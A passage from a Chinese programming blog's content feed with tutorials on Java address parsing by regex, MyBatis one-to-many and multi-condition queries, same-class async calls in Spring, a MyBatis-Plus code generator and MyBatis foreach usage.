class="token operator">></span> <span class="token function">getAddress</span><span class="token punctuation">(</span>String address<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//        String pattern = "(?&lt;province>[^省]+自治区|.*?省|.*?行政区|.*?特别行政区)?(?&lt;city>[^市]+自治州|[^市]+市|.*?地区|.*?盟)?(?&lt;county>[^县]+县|.*?市|.*?区)?(?&lt;town>[^镇]+镇|.*?街道办事处)?(?&lt;village>.*)";</span>        String pattern <span class="token operator">=</span> <span class="token string">"(?&lt;province>[^省]+自治区|.*?省|.*?行政区|.*?特别行政区)?(?&lt;city>[^市]+自治州|[^市]+市|.*?地区|.*?盟)?(?&lt;county>[^县]+县|.*?市|.*?区)?(?&lt;village>.*)"</span><span class="token punctuation">;</span>        Pattern r <span class="token operator">=</span> Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span>pattern<span class="token punctuation">)</span><span class="token punctuation">;</span>        Matcher m <span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"province"</span><span class="token punctuation">,</span> StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token string">"province"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> m<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token string">"province"</span><span class="token punctuation">)</span> <span class="token operator">:</span> m<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token string">"city"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"city"</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token string">"city"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"district"</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token string">"county"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            result<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"detailAddress"</span><span class="token punctuation">,</span> m<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token string">"village"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//                System.out.println("省：" + m.group("province"));</span>            <span class="token comment" spellcheck="true">//                System.out.println("市：" + m.group("city"));</span>            <span class="token comment" spellcheck="true">//                System.out.println("区/县：" + m.group("county"));</span>            <span class="token comment" spellcheck="true">//                System.out.println("镇/街道办事处+村/社区：" + m.group("town")+ m.group("village"));</span>            <span class="token comment" spellcheck="true">//                System.out.println("-------------------------------------------------");</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"未匹配到地址信息"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> 地址解析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis一对多查询</title>
      <link href="/2022/03/12/mybatis-yi-dui-duo-cha-xun/"/>
      <url>/2022/03/12/mybatis-yi-dui-duo-cha-xun/</url>
      
        <content type="html"><![CDATA[<h1 id="Mybatis一对多查询"><a href="#Mybatis一对多查询" class="headerlink" title="Mybatis一对多查询"></a>Mybatis一对多查询</h1><p>在MyBatis中，可以使用嵌套查询或嵌套结果映射来实现一对多查询。以下是一种常见的实现方式：</p><p>假设有两个实体类：<code>Order</code>和<code>OrderItem</code>，一个订单可以有多个订单项。</p><ol><li>首先，在<code>Order</code>实体类中添加一个<code>List&lt;OrderItem&gt;</code>类型的属性，并提供相应的getter和setter方法。</li></ol><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Order</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Long id<span class="token punctuation">;</span>    <span class="token keyword">private</span> String orderNo<span class="token punctuation">;</span>    <span class="token keyword">private</span> List<span class="token operator">&lt;</span>OrderItem<span class="token operator">></span> orderItems<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// getter和setter方法</span><span class="token punctuation">}</span></code></pre><ol start="2"><li>在MyBatis的映射文件中，使用嵌套查询或嵌套结果映射来查询订单和订单项。</li></ol><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>orderResultMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Order<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order_id<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>orderNo<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order_no<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>collection</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>orderItems<span class="token punctuation">"</span></span> <span class="token attr-name">ofType</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>OrderItem<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item_id<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>itemName<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>item_name<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>quantity<span class="token punctuation">"</span></span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>quantity<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>collection</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getOrderWithItems<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>orderResultMap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    SELECT o.id as order_id, o.order_no, i.id as item_id, i.item_name, i.quantity    FROM orders o    LEFT JOIN order_items i ON o.id = i.order_id    WHERE o.id = #{orderId}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span></code></pre><p>在上述示例中，我们使用<code>&lt;collection&gt;</code>标签来定义订单项的集合属性，并使用<code>ofType</code>属性指定集合元素的类型。<strong>需要注意<code>&lt;resultMap&gt;</code>标签一定要有<code>&lt;id&gt;</code>标签</strong>。通过<code>LEFT JOIN</code>将订单表和订单项表关联起来，并使用<code>WHERE</code>子句来限定查询的订单ID。</p><ol start="3"><li>在Java代码中调用查询方法，获取订单和订单项的关联数据。</li></ol><pre class=" language-java"><code class="language-java">Order order <span class="token operator">=</span> orderMapper<span class="token punctuation">.</span><span class="token function">getOrderWithItems</span><span class="token punctuation">(</span>orderId<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>这样，就可以通过一次查询获取订单和订单项的关联数据。请根据您的实际情况进行相应的调整和扩展。</p>]]></content>
      
      
      <categories>
          
          <category> Mybatis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis实现同字段多选条件查询</title>
      <link href="/2022/02/22/mybatis-shi-xian-tong-zi-duan-duo-xuan-tiao-jian-cha-xun/"/>
      <url>/2022/02/22/mybatis-shi-xian-tong-zi-duan-duo-xuan-tiao-jian-cha-xun/</url>
      
        <content type="html"><![CDATA[<h1 id="同一列多个筛选条件查询"><a href="#同一列多个筛选条件查询" class="headerlink" title="同一列多个筛选条件查询"></a>同一列多个筛选条件查询</h1><p><img src="/images/%E5%90%8C%E4%B8%80%E5%AD%97%E6%AE%B5%E5%A4%9A%E4%BC%A0%E7%AD%9B%E9%80%891.png"></p><p><img src="/images/%E5%90%8C%E4%B8%80%E5%AD%97%E6%AE%B5%E5%A4%9A%E4%BC%A0%E7%AD%9B%E9%80%892.png"></p><p><img src="/images/%E5%90%8C%E4%B8%80%E5%AD%97%E6%AE%B5%E5%A4%9A%E4%BC%A0%E7%AD%9B%E9%80%893.png"></p><pre class=" language-java"><code class="language-java"> <span class="token operator">&lt;</span>select id<span class="token operator">=</span><span class="token string">"getProductMapListVo"</span> resultType<span class="token operator">=</span><span class="token string">"com.psds.bdt.resource.controller.req.ProductMapListVo"</span><span class="token operator">></span>        SELECT p<span class="token punctuation">.</span>id<span class="token punctuation">,</span> typeName1<span class="token punctuation">,</span> typeName2<span class="token punctuation">,</span>ent_name entName<span class="token punctuation">,</span>invest<span class="token punctuation">,</span>tagName<span class="token punctuation">,</span>type1<span class="token punctuation">,</span>type2<span class="token punctuation">,</span>tag<span class="token punctuation">,</span>create_time        <span class="token function">FROM</span><span class="token punctuation">(</span>        SELECT t<span class="token punctuation">.</span>id<span class="token punctuation">,</span> a<span class="token punctuation">.</span>product_name typeName1<span class="token punctuation">,</span>b<span class="token punctuation">.</span>product_name typeName2<span class="token punctuation">,</span>ent_name<span class="token punctuation">,</span>invest<span class="token punctuation">,</span>tag <span class="token punctuation">,</span>type1<span class="token punctuation">,</span>type2<span class="token punctuation">,</span>        <span class="token function">GROUP_CONCAT</span><span class="token punctuation">(</span>DISTINCT c<span class="token punctuation">.</span>dict_label ORDER BY <span class="token function">find_in_set</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>dict_value<span class="token punctuation">,</span>t<span class="token punctuation">.</span>tag<span class="token punctuation">)</span><span class="token punctuation">)</span> tagName<span class="token punctuation">,</span>create_time        FROM zy_product_map t        LEFT JOIN semi_product_node_count a ON t<span class="token punctuation">.</span>type1<span class="token operator">=</span>a<span class="token punctuation">.</span>id        LEFT JOIN semi_product_node_count b ON t<span class="token punctuation">.</span>type2<span class="token operator">=</span>b<span class="token punctuation">.</span>id        LEFT <span class="token function">JOIN</span> <span class="token punctuation">(</span>select dict_label<span class="token punctuation">,</span>dict_value FROM sys_dict_data WHERE dict_type<span class="token operator">=</span><span class="token string">'ent_label'</span><span class="token punctuation">)</span> c ON        <span class="token function">find_in_set</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>dict_value<span class="token punctuation">,</span> t<span class="token punctuation">.</span>tag<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span>        GROUP BY t<span class="token punctuation">.</span>id        <span class="token punctuation">)</span> p        <span class="token operator">&lt;</span>where<span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token keyword">if</span> test<span class="token operator">=</span><span class="token string">"typeName!=null and typeName!=''"</span><span class="token operator">></span>                <span class="token function">AND</span> <span class="token punctuation">(</span>typeName1<span class="token operator">=</span>#<span class="token punctuation">{</span>typeName<span class="token punctuation">}</span> OR typeName2<span class="token operator">=</span>#<span class="token punctuation">{</span>typeName<span class="token punctuation">}</span><span class="token punctuation">)</span>            <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token keyword">if</span> test<span class="token operator">=</span><span class="token string">"invest!=null and invest!=''"</span><span class="token operator">></span>                AND p<span class="token punctuation">.</span>invest <span class="token operator">=</span>#<span class="token punctuation">{</span>invest<span class="token punctuation">}</span>            <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token keyword">if</span> test<span class="token operator">=</span><span class="token string">"entName!=null and entName!=''"</span><span class="token operator">></span>                AND p<span class="token punctuation">.</span>ent_name like <span class="token function">CONCAT</span><span class="token punctuation">(</span><span class="token string">'%'</span><span class="token punctuation">,</span>#<span class="token punctuation">{</span>entName<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">)</span>            <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token keyword">if</span> test<span class="token operator">=</span><span class="token string">"id!=null"</span><span class="token operator">></span>                AND id<span class="token operator">=</span>#<span class="token punctuation">{</span>id<span class="token punctuation">}</span>            <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token keyword">if</span> test<span class="token operator">=</span><span class="token string">"tagList!=null"</span><span class="token operator">></span>                and                <span class="token operator">&lt;</span>foreach collection<span class="token operator">=</span><span class="token string">"tagList"</span> item<span class="token operator">=</span><span class="token string">"item"</span> open<span class="token operator">=</span><span class="token string">"("</span> separator<span class="token operator">=</span><span class="token string">" or "</span> close<span class="token operator">=</span><span class="token string">")"</span><span class="token operator">></span>                    <span class="token function">FIND_IN_SET</span><span class="token punctuation">(</span>#<span class="token punctuation">{</span>item<span class="token punctuation">}</span><span class="token punctuation">,</span>tag<span class="token punctuation">)</span>                <span class="token operator">&lt;</span><span class="token operator">/</span>foreach<span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">if</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>where<span class="token operator">></span>        order by create_time DESC    <span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Mybatis </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>同一个类中使用异步调用</title>
      <link href="/2022/01/22/tong-yi-ge-lei-zhong-shi-yong-yi-bu-diao-yong/"/>
      <url>/2022/01/22/tong-yi-ge-lei-zhong-shi-yong-yi-bu-diao-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="同一个类中使用异步调用"><a href="#同一个类中使用异步调用" class="headerlink" title="同一个类中使用异步调用"></a>同一个类中使用异步调用</h1><p>使用Async注解也可实现同一个类中使用异步调用</p><ol><li>引入上下文</li></ol><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Resource</span><span class="token keyword">private</span> ApplicationContext applicationContext<span class="token punctuation">;</span></code></pre><ol start="2"><li>使用注解定义异步方法</li></ol><p><img src="/images/%E5%90%8C%E4%B8%80%E4%B8%AA%E7%B1%BB%E4%B8%AD%E4%BD%BF%E7%94%A8%E5%BC%82%E6%AD%A5.png"></p><ol start="3"><li>获取自己的代理对象调用异步方法</li></ol><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//通过上下文获取自己的代理对象调用异步方法</span>EnterpriseService bean <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>EnterpriseService<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>bean<span class="token punctuation">.</span><span class="token function">insertNodeEnt</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> enterprise<span class="token punctuation">.</span><span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 异步 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis-Plus代码生成器</title>
      <link href="/2021/11/24/mybatisplus-dai-ma-sheng-cheng-qi/"/>
      <url>/2021/11/24/mybatisplus-dai-ma-sheng-cheng-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="Mybatis-Plus代码生成器"><a href="#Mybatis-Plus代码生成器" class="headerlink" title="Mybatis-Plus代码生成器"></a>Mybatis-Plus代码生成器</h1><h2 id="pom依赖"><a href="#pom依赖" class="headerlink" title="pom依赖"></a>pom依赖</h2><pre class=" language-java"><code class="language-java">         <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>mybatisPlus依赖<span class="token operator">--</span><span class="token operator">></span>        <span class="token operator">&lt;</span>dependency<span class="token operator">></span>            <span class="token operator">&lt;</span>groupId<span class="token operator">></span>com<span class="token punctuation">.</span>baomidou<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>            <span class="token operator">&lt;</span>artifactId<span class="token operator">></span>mybatis<span class="token operator">-</span>plus<span class="token operator">-</span>boot<span class="token operator">-</span>starter<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>mybatisPlus代码生成器<span class="token operator">--</span><span class="token operator">></span>        <span class="token operator">&lt;</span>dependency<span class="token operator">></span>            <span class="token operator">&lt;</span>groupId<span class="token operator">></span>com<span class="token punctuation">.</span>baomidou<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>            <span class="token operator">&lt;</span>artifactId<span class="token operator">></span>mybatis<span class="token operator">-</span>plus<span class="token operator">-</span>generator<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>            <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">3.4</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span>        <span class="token operator">&lt;</span>dependency<span class="token operator">></span>            <span class="token operator">&lt;</span>groupId<span class="token operator">></span>org<span class="token punctuation">.</span>freemarker<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>            <span class="token operator">&lt;</span>artifactId<span class="token operator">></span>freemarker<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>            <span class="token operator">&lt;</span>version<span class="token operator">></span><span class="token number">2.3</span><span class="token punctuation">.</span><span class="token number">31</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span></code></pre><h2 id="生成代码"><a href="#生成代码" class="headerlink" title="生成代码"></a>生成代码</h2><pre><code>package com.it.util;import com.alibaba.excel.util.StringUtils;import com.baomidou.mybatisplus.core.exceptions.MybatisPlusException;import com.baomidou.mybatisplus.generator.AutoGenerator;import com.baomidou.mybatisplus.generator.InjectionConfig;import com.baomidou.mybatisplus.generator.config.*;import com.baomidou.mybatisplus.generator.config.po.TableInfo;import com.baomidou.mybatisplus.generator.config.rules.NamingStrategy;import com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine;import java.util.ArrayList;import java.util.List;import java.util.Scanner;/** * MP代码生成器 * * @Author CZM */public class CodeGenerator &#123;    /**     * &lt;p&gt;     * 读取控制台内容     * &lt;/p&gt;     */    public static String scanner(String tip) &#123;        Scanner scanner = new Scanner(System.in);        StringBuilder help = new StringBuilder();        help.append(&quot;请输入&quot; + tip + &quot;：&quot;);        System.out.println(help);        if (scanner.hasNext()) &#123;            String ipt = scanner.next();            if (StringUtils.isNotBlank(ipt)) &#123;                return ipt;            &#125;        &#125;        throw new MybatisPlusException(&quot;请输入正确的&quot; + tip + &quot;！&quot;);    &#125;    /**     * 自动生成代码     */    public static void main(String[] args) &#123;        // 代码生成器        AutoGenerator mpg = new AutoGenerator();        // TODO 全局配置        GlobalConfig gc = new GlobalConfig();        String projectPath = System.getProperty(&quot;user.dir&quot;);        // 生成文件的输出目录【默认 D 盘根目录】        gc.setOutputDir(projectPath + &quot;/blog/src/main/java&quot;);        // 作者        gc.setAuthor(&quot;CZM&quot;);        // 是否打开输出目录        gc.setOpen(false);        // controller 命名方式，注意 %s 会自动填充表实体属性        gc.setControllerName(&quot;%sController&quot;);        // service 命名方式        gc.setServiceName(&quot;%sService&quot;);        // serviceImpl 命名方式        gc.setServiceImplName(&quot;%sServiceImpl&quot;);        // mapper 命名方式        gc.setMapperName(&quot;%sMapper&quot;);        // xml 命名方式        gc.setXmlName(&quot;%sMapper&quot;);        // 开启 swagger2 模式        gc.setSwagger2(true);        // 是否覆盖已有文件        gc.setFileOverride(true);        // 是否开启 ActiveRecord 模式        gc.setActiveRecord(true);        // 是否在xml中添加二级缓存配置        gc.setEnableCache(false);        // 是否开启 BaseResultMap        gc.setBaseResultMap(true);        // XML columList        gc.setBaseColumnList(false);        // 全局 相关配置        mpg.setGlobalConfig(gc);        // TODO 数据源配置        DataSourceConfig dsc = new DataSourceConfig();        dsc.setUrl(&quot;jdbc:mysql://127.0.0.1:3306/zm_blog?useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC&amp;useSSL=true&amp;characterEncoding=UTF-8&quot;);        dsc.setDriverName(&quot;com.mysql.cj.jdbc.Driver&quot;);        dsc.setUsername(&quot;root&quot;);        dsc.setPassword(&quot;root&quot;);        mpg.setDataSource(dsc);        // TODO 包配置        PackageConfig pc = new PackageConfig();        // 父包名。如果为空，将下面子包名必须写全部， 否则就只需写子包名        pc.setParent(&quot;com.it&quot;);        // Entity包名        pc.setEntity(&quot;entity&quot;);        // Service包名        pc.setService(&quot;service&quot;);        // Service Impl包名        pc.setServiceImpl(&quot;service.impl&quot;);        mpg.setPackageInfo(pc);        // TODO 自定义配置        InjectionConfig cfg = new InjectionConfig() &#123;            @Override            public void initMap() &#123;                // to do nothing            &#125;        &#125;;        // 输出文件配置        List&lt;FileOutConfig&gt; focList = new ArrayList&lt;&gt;();        focList.add(new FileOutConfig(&quot;/templates/mapper.xml.ftl&quot;) &#123;            @Override            public String outputFile(TableInfo tableInfo) &#123;                // 自定义输入文件名称                return projectPath + &quot;/blog/src/main/resources/mapper/&quot; + tableInfo.getEntityName() + &quot;Mapper.xml&quot;;            &#125;        &#125;);        // 自定义输出文件        cfg.setFileOutConfigList(focList);        mpg.setCfg(cfg);        mpg.setTemplate(new TemplateConfig().setXml(null));        // TODO 策略配置        StrategyConfig strategy = new StrategyConfig();        // 数据库表映射到实体的命名策略，驼峰原则        strategy.setNaming(NamingStrategy.underline_to_camel);        // 字数据库表字段映射到实体的命名策略，驼峰原则        strategy.setColumnNaming(NamingStrategy.underline_to_camel);        // 实体是否生成 serialVersionUID        strategy.setEntitySerialVersionUID(false);        // 是否生成实体时，生成字段注解        strategy.setEntityTableFieldAnnotationEnable(true);        // 使用lombok        strategy.setEntityLombokModel(true);        // 设置逻辑删除键        strategy.setLogicDeleteFieldName(&quot;del_flag&quot;);        // TODO 指定生成的bean的数据库表名        strategy.setInclude(scanner(&quot;表名，多个英文逗号分割&quot;).split(&quot;,&quot;));        // 驼峰转连字符        strategy.setControllerMappingHyphenStyle(true);        mpg.setStrategy(strategy);        // 选择 freemarker 引擎需要指定如下加，注意 pom 依赖必须有！        mpg.setTemplateEngine(new FreemarkerTemplateEngine());        mpg.execute();    &#125;&#125;</code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> Mybatis-Plus </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis-Plus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mybatis中 foreach collection的三种用法</title>
      <link href="/2021/11/22/mybatis-zhong-foreach-collection-de-san-chong-yong-fa/"/>
      <url>/2021/11/22/mybatis-zhong-foreach-collection-de-san-chong-yong-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="Mybatis中-foreach-collection的三种用法"><a href="#Mybatis中-foreach-collection的三种用法" class="headerlink" title="Mybatis中 foreach collection的三种用法"></a>Mybatis中 foreach collection的三种用法</h1><p><a href="https://blog.csdn.net/qq_37279783/article/details/86690115">https://blog.csdn.net/qq_37279783/article/details/86690115</a></p><p>foreach元素的属性主要有 item，index，collection，open，separator，close。</p><pre class=" language-sql"><code class="language-sql">item 表示集合中每一个元素进行迭代时的别名，<span class="token keyword">index</span> 指定一个名字，用于表示在迭代过程中，每次迭代到的位置，<span class="token keyword">open</span> 表示该语句以什么开始，separator 表示在每次进行迭代之间以什么符号作为分隔 符，<span class="token keyword">close</span> 表示以什么结束。</code></pre><p>在使用foreach的时候最关键的也是最容易出错的就是collection属性，该属性是必须指定的，但是在不同情况 下，该属性的值是不一样的，主要有一下3种情况：</p><pre class=" language-sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">.</span> 如果传入的是单参数且参数类型是一个List的时候，collection属性值为list<span class="token number">2</span><span class="token punctuation">.</span> 如果传入的是单参数且参数类型是一个array数组的时候，collection的属性值为array<span class="token number">3</span><span class="token punctuation">.</span> 如果传入的参数是多个的时候，我们就需要把它们封装成一个Map了，当然单参数也可</code></pre><p>map，实际上如果你在传入参数的时候，在breast里面也是会把它封装成一个Map的，map的key就是参数名，所以这个时候collection属性值就是传入的List或array对象在自己封装的map里面的key 下面分别来看看上述三种情况的示例代码：</p><h2 id="1-单参数List的类型"><a href="#1-单参数List的类型" class="headerlink" title="1.单参数List的类型"></a>1.单参数List的类型</h2><pre class=" language-sql"><code class="language-sql"><span class="token operator">&lt;</span><span class="token keyword">select</span> id<span class="token operator">=</span><span class="token string">"dynamicForeachTest"</span> parameterType<span class="token operator">=</span><span class="token string">"java.util.List"</span> resultType<span class="token operator">=</span><span class="token string">"Blog"</span><span class="token operator">></span>           <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_blog <span class="token keyword">where</span> id <span class="token operator">in</span>        <span class="token operator">&lt;</span>foreach collection<span class="token operator">=</span><span class="token string">"list"</span> <span class="token keyword">index</span><span class="token operator">=</span><span class="token string">"index"</span> item<span class="token operator">=</span><span class="token string">"item"</span> <span class="token keyword">open</span><span class="token operator">=</span><span class="token string">"("</span> separator<span class="token operator">=</span><span class="token string">","</span> <span class="token keyword">close</span><span class="token operator">=</span><span class="token string">")"</span><span class="token operator">></span>                <span class="token comment" spellcheck="true">#{item}       </span>        <span class="token operator">&lt;</span><span class="token operator">/</span>foreach<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span><span class="token keyword">select</span><span class="token operator">></span></code></pre><p>上述collection的值为list，对应的Mapper是这样的<br>public List dynamicForeachTest(List ids);<br>测试代码：</p><pre class=" language-csharp"><code class="language-csharp">  @Test      <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dynamicForeachTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          SqlSession session <span class="token operator">=</span> Util<span class="token punctuation">.</span><span class="token function">getSqlSessionFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">openSession</span><span class="token punctuation">(</span><span class="token 